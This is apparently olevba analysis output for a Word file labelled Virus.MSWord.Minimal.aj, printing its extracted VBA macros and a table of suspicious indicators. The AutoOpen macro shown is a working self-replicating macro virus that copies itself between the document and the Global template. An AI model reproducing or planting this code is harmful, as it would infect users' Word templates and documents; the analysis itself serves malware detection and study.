olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.aj-9f0151a1af345ada0cb02c99e4bd34a049822619
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.aj-9f0151a1af345ada0cb02c99e4bd34a049822619 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Minimal.aj-9f0151a1af345ada0cb02c99e4bd34a049822619 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
Dim a$
Dim b$
Dim c$
c$ = WordBasic.[FileName$]()
On Error Resume Next: a$ = c$ + ":AutoopeN"
b$ = "Global:aUTOOPEn": WordBasic.MacroCopy a$, b$
WordBasic.MacroCopy b$, a$
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
